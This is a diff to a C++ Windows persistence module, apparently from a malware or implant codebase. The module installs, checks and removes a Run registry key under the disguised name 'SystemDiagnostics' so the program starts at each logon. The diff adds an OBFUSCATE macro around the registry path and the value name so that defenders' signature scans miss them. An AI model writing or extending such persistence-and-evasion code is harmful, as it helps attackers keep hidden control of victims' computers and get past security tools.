@@ -1,6 +1,7 @@
 #include "PersistenceModule.h"
 #include "Globals.h"
 #ifdef _WIN32
+#include "Obfuscation.h"
 #include <windows.h>
 #include <string>
 #endif
@@ -18,9 +19,9 @@ static std::string executable_path() {
 static void set_run_key(const std::string& path) {
     HKEY key;
     if (RegOpenKeyExA(HKEY_CURRENT_USER,
-            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
+            OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0,
             KEY_WRITE, &key) == ERROR_SUCCESS) {
-        RegSetValueExA(key, "SystemDiagnostics", 0, REG_SZ,
+        RegSetValueExA(key, OBFUSCATE("SystemDiagnostics"), 0, REG_SZ,
             (const BYTE*)path.c_str(), path.size()+1);
         RegCloseKey(key);
     }
@@ -29,13 +30,13 @@ static void set_run_key(const std::string& path) {
 static bool check_run_key(const std::string& path) {
     HKEY key;
     if (RegOpenKeyExA(HKEY_CURRENT_USER,
-            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
+            OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0,
             KEY_READ, &key) != ERROR_SUCCESS) {
         return false;
     }
     char buf[MAX_PATH];
     DWORD len = sizeof(buf);
-    LONG ret = RegQueryValueExA(key, "SystemDiagnostics", NULL, NULL,
+    LONG ret = RegQueryValueExA(key, OBFUSCATE("SystemDiagnostics"), NULL, NULL,
             (LPBYTE)buf, &len);
     RegCloseKey(key);
     if (ret != ERROR_SUCCESS) return false;
@@ -55,9 +56,9 @@ static bool check_task() {
 static void remove_run_key() {
     HKEY key;
     if (RegOpenKeyExA(HKEY_CURRENT_USER,
-            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0,
+            OBFUSCATE("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0,
             KEY_WRITE, &key) == ERROR_SUCCESS) {
-        RegDeleteValueA(key, "SystemDiagnostics");
+        RegDeleteValueA(key, OBFUSCATE("SystemDiagnostics"));
         RegCloseKey(key);
     }
 }
